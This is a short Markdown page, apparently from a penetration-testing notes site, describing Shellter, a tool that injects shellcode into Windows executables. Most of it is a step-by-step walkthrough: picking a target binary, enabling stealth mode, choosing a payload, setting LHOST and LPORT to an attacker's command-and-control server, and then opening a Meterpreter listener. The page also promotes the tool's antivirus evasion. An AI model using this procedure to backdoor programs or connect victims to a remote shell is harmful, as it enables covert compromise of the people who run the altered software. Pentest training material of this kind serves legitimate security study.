---
title: "Shellter"
description: "Dynamic shellcode infection"
lead: ""
date: 2020-10-13T15:21:01+02:00
lastmod: 2020-10-13T15:21:01+02:00
draft: false
images: []
menu: 
  tools:
    parent: "attacker_tools"
weight: 20
toc: true
---

Shellter[^1] is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.
It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only).
The shellcode can be something yours or something generated through a framework, such as Metasploit.

Even the default options offer impressive AV evasion capabilities.

## Installation
Download from: https://www.shellterproject.com/download/

```bash
#start shellter
shellter 

#Choose Operation Mode
A

#PE Target 
/home/kali/...

#Enable Stealh Mode?
Y

#Use a listed pazload or custom:
L

#Select payload by index: (select preferred)
1 

#SET LHOST -> your c2 server ip
X.X.X.X 

#SET LPORT -> port your c2 server listen to
```

The provided binary will be replaced with the modified one. 
Next step is to open a meterpreter listener with the above parameters.


[^1]: [Shellter](https://www.shellterproject.com/introducing-shellter/)